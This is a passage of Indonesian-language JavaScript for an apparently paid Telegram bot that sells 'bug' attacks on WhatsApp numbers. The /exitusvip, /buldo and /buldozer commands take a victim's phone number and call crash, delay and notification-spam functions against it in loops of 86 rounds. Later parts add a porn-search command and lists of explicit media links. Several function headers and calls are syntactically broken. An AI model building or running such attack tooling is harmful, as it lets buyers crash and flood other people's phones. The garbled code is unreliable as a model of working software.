  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/exitusvip (\d+)/, async function TrashProtocol(target, mention) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "t.me/sanzz44" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6nzx0v.jpg", {
      caption: `
\`\`\`
- DELAY
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- DELAY
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 85; i++) {   
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   await ZhTCover(rizz, target);
   await ZhTCover(rizz, target);
   await ZhTCover(rizz, target);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await XNecroCrashCrL(target);
   await XNecroCrashCrL(target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- DELAY
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/buldo (\d+)/, async function delay2v(sock, target) (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "t.me/sanzz44" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6nzx0v.jpg", {
      caption: `
\`\`\`
- FcAndro
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- FcAndro
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 85; i++) {   
   delayinvisible(target, mention = false);   
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await ZhTHasclaw(sock, target, mention);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await DelayHard(sock, target);
   await ZhTHasclaw(sock, target, mention);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   delayinvisible(target, mention = false);
   await XNecroCrashCrL(target);
   await XNecroCrashCrL(target);
   await XNecroCrashCrL(target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- FcAndro
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/buldozer (\d+)/, asnyc function LocaX(isTarget) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "t.me/sanzz44" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6nzx0v.jpg", {
      caption: `
\`\`\`
- delaymention
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- buldozer 
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 85; i++) {   
   await vXdelay(target);
   await vXdelay(target);
   await vXdelay(target);
   await vXdelay(target);
   await vXdelay(target, Ptcp = true);
   await Notifspam(target, Ptcp = true);
   await Notifspam(target, Ptcp = true);
   await Notifspam(target, Ptcp = true);
   await vXdelay(target);
   await vXdelay(target);
   const delay = ms => new Promise(res => setTimeout(10000));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- buldozer
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//PLUNGWIEUDH
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//case tools
bot.onText(/\/stiktok(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const keyword = match[1]?.trim() || msg.reply_to_message?.text?.trim();

  if (!keyword) {
    return bot.sendMessage(chatId, '❌ Mohon masukkan kata kunci. Contoh: /stiktok sad');
  }

  try {
    const response = await axios.post('https://api.siputzx.my.id/api/s/tiktok', {
      query: keyword
    }, {
      headers: { 'Content-Type': 'application/json' }
    });

    const data = response.data;
    if (!data.status || !Array.isArray(data.data) || data.data.length === 0) {
      return bot.sendMessage(chatId, '⚠️ Tidak ditemukan video TikTok dengan kata kunci tersebut.');
    }

    const videos = data.data.slice(0, 3);
    let replyText = `🔎 Hasil pencarian TikTok untuk: *${keyword}*\n\n`;

    for (const video of videos) {
      const title = video.title?.trim() || 'Tanpa Judul';
      replyText += `🎬 *${title}*\n`;
      replyText += `👤 ${video.author.nickname} (@${video.author.unique_id})\n`;
      replyText += `▶️ [Link Video](${video.play})\n`;
      replyText += `🎵 Musik: ${video.music_info.title} - ${video.music_info.author}\n`;
      replyText += `⬇️ [Download WM](${video.wmplay})\n\n`;
    }

    bot.sendMessage(chatId, replyText, { parse_mode: 'Markdown' });

  } catch (error) {
    console.error(error?.response?.data || error.message);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data TikTok.');
  }
});
bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // hanya bisa di grup
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
  }

  // harus reply atau sebut username
  const repliedUser = msg.reply_to_message?.from;
  const username = match[1];
  let targetUser;

  if (repliedUser) {
    targetUser = repliedUser;
  } else if (username) {
    // ambil member dari username
    try {
      const members = await bot.getChatAdministrators(chatId);
      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
    } catch (e) {
      console.error("Gagal ambil member:", e.message);
    }
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
  }

  try {
    await bot.restrictChatMember(chatId, targetUser.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      }
    });

    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Error unmute:", err.message);
    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
  }
});

bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus reply pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-mute.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-mute di grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});
const FormData = require("form-data");

bot.onText(/^\/xnxx(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(chatId, '🔍 Contoh penggunaan:\n/xnxx jepang');
  }

  try {
    const res = await axios.get('https://www.ikyiizyy.my.id/search/xnxx', {
      params: {
        apikey: 'new',
        q: query
      }
    });

    const results = res.data.result;

    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan hasil untuk: *${query}*`, { parse_mode: 'Markdown' });
    }

    const text = results.slice(0, 3).map((v, i) => (
      `📹 *${v.title}*\n🕒 Durasi: ${v.duration}\n🔗 [Tonton Sekarang](${v.link})`
    )).join('\n\n');

    bot.sendMessage(chatId, `🔞 Hasil untuk: *${query}*\n\n${text}`, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
  }
});

bot.onText(/^\/unmute(?:\s+@?(\w+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // hanya bisa di grup
  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "⚠️ Command ini hanya bisa dipakai di grup.");
  }

  // harus reply atau sebut username
  const repliedUser = msg.reply_to_message?.from;
  const username = match[1];
  let targetUser;

  if (repliedUser) {
    targetUser = repliedUser;
  } else if (username) {
    // ambil member dari username
    try {
      const members = await bot.getChatAdministrators(chatId);
      targetUser = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase())?.user;
    } catch (e) {
      console.error("Gagal ambil member:", e.message);
    }
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ Balas pesan user atau sebut username untuk unmute.");
  }

  try {
    await bot.restrictChatMember(chatId, targetUser.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      }
    });

    bot.sendMessage(chatId, `✅ User [${targetUser.first_name}](tg://user?id=${targetUser.id}) sudah di-*unmute*.`, {
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Error unmute:", err.message);
    bot.sendMessage(chatId, "❌ Gagal unmute user. Pastikan bot punya izin admin.");
  }
});

bot.onText(/^\/muslimai(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, "🤖 Mau nanya apa ke MuslimAi?\nContoh: `/muslimai Apa arti hidup?`", {
      parse_mode: "Markdown"
    });
  }

  await bot.sendMessage(chatId, "⏳ Sedang mencari jawaban dari MuslimAi...");

  try {
    const response = await axios.get(`https://api.siputzx.my.id/api/ai/muslimai?query=${encodeURIComponent(text)}`);

    const hasil = `
*[ Muslim Ai ]*
📌 Pertanyaan: ${text}

💡 Jawaban: ${response.data.data}
`;

    bot.sendMessage(chatId, hasil, { parse_mode: "Markdown" });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses pertanyaan MuslimAi.");
  }
});
 
// Daftar khodam
const khodam = [
  "Kulkas 2 pintu", "Kumis lele", "Kumis Lele", "Lemari dua Pintu", "Kacang Hijau",
  "Kulkas mini", "Burung beo", "Air", "Api", "Batu", "Magnet", "Sempak", "Botol Tupperware",
  "Badut Mixue", "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan",
  "Upin", "Ipin", "sungut lele", "Tok Dalang", "Opah", "Opet", "Alul", "Pak Vinsen",
  "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", "Lumpia Basah", "Bjorka", "Hacker",
  "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", "Seblak", "Aromanis",
  "Gelembung sabun", "Kuda", "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan",
  "Nasi Kucing", "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang",
  "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", "Sayur Asem",
  "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", "Lintah Terbang",
  "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", "Beat Mber", "Supra Geter",
  "Oli Samping", "Knalpot Racing", "Jus Stroberi", "Jus Alpukat", "Alpukat Kocok",
  "Es Kopyor", "Es Jeruk", "@whiskeysockets/baileys", "chalk", "gradient-string",
  "@adiwajshing", "d-scrape", "undefined", "cannot read properties", "performance-now",
  "os", "node-fetch", "form-data", "axios", "util", "fs-extra", "scrape-primbon",
  "child_process", "emoji-regex", "check-disk-space", "perf_hooks", "moment-timezone",
  "cheerio", "fs", "process", "require( . . . )", "import ... from ...", "rate-overlimit",
  "Cappucino Cincau", "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu",
  "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", "Kotak Amal",
  "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", "Ban Serep", "Kursi Lipat",
  "Kursi Goyang", "Kulit Pisang", "Warung Madura", "Gorong-gorong"
];

// Fungsi pilih khodam random
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())];
}

// Command: /cekkhodam <nama>
bot.onText(/^\/cekkhodam(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Masukkan nama siapa yang mau di cek khodam-nya.\n\nContoh: `/cekkhodam Jamal`", {
      parse_mode: "Markdown"
    });
  }

  const kdm = pickRandom(khodam);
  const kodamn = `*Khodam ${text} adalah:* ${kdm}`;

  bot.sendMessage(chatId, kodamn, { parse_mode: "Markdown" });
});

const paptt = [
  "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
  "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
  "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
  "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
  "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
  "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
  "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
  "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
  "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
  "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
  "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
  "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
  "https://telegra.ph/file/267744a1a8c897b1636b9.jpg"
];

// Fungsi ambil random
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)];
}

// Command: /pap
bot.onText(/^\/paptt$/, (msg) => {
  const chatId = msg.chat.id;
  if (!premiumUsers.includes(msg.from.id)) {
    return resricted(msg.from.id);
  }
  const url = pickRandom(paptt);

  // Tentukan tipe file berdasarkan ekstensi
  if (url.endsWith(".mp4")) {
    bot.sendVideo(chatId, url, { caption: "Nohh 🎥" });
  } else if (url.endsWith(".jpg")) {
    bot.sendPhoto(chatId, url, { caption: "Nohh 📷" });
  } else {
    bot.sendMessage(chatId, "Nohh", { reply_to_message_id: msg.message_id });
  }
});

const bokep = [
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
  "https://files.catbox.moe/ii5g4r.mp4", 
